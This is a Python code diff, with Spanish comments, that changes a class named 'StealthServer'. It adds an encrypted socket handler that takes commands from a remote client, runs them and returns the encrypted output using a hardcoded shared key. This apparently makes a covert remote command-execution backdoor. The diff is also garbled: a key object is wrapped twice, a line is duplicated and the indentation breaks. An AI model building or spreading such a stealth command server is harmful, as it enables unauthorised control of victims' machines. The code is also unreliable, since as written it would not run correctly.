@@ -66,12 +66,13 @@ import time
 import json
 import subprocess
 import os
+import struct  # ← Añadir este import
 from cryptography.fernet import Fernet
 
 class StealthServer:
     def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
+        self.key = Fernet(b'2V6yY4lLf97hB0mKnR8qCw1xZ3zA5eG7dF0jH4sP9rT2uM6vX8cB')  # Misma clave
+        self.cipher = Fernet(self.key)        self.cipher = Fernet(self.key)
         self.running = True
     
     def execute_command(self, cmd):
@@ -96,19 +97,51 @@ class StealthServer:
             except:
                 pass
     
-    def handle_client(self, client, addr):
-        """Manejar cliente"""
+   def handle_client(self, client, addr):
+    """Manejar cliente - VERSIÓN COMPATIBLE"""
+    try:
+        # Primero recibir el tamaño del mensaje (4 bytes)
+        size_data = client.recv(4)
+        if not size_data:
+            return
+            
+        size = struct.unpack('!I', size_data)[0]
+        
+        # Recibir el mensaje completo
+        encrypted_data = b''
+        while len(encrypted_data) < size:
+            chunk = client.recv(min(4096, size - len(encrypted_data)))
+            if not chunk:
+                break
+            encrypted_data += chunk
+        
+        # Descifrar
         try:
-            data = client.recv(4096)
-            if data:
-                command = json.loads(data.decode())
-                result = self.execute_command(command.get('cmd', ''))
-                client.send(json.dumps(result).encode())
+            decrypted_data = self.cipher.decrypt(encrypted_data)
+            command = json.loads(decrypted_data.decode())
         except:
-            pass
-        finally:
-            client.close()
-
+            # Si falla el descifrado, intentar como texto plano
+            try:
+                command = json.loads(encrypted_data.decode())
+            except:
+                return
+        
+        # Ejecutar comando
+        result = self.execute_command(command.get('data', {}).get('command', ''))
+        
+        # Cifrar respuesta
+        response_json = json.dumps(result)
+        encrypted_response = self.cipher.encrypt(response_json.encode())
+        
+        # Enviar tamaño + respuesta
+        client.send(struct.pack('!I', len(encrypted_response)))
+        client.send(encrypted_response)
+        
+    except Exception as e:
+        pass
+    finally:
+        client.close()
+        
 def main():
     server = StealthServer()
     server.start_server()
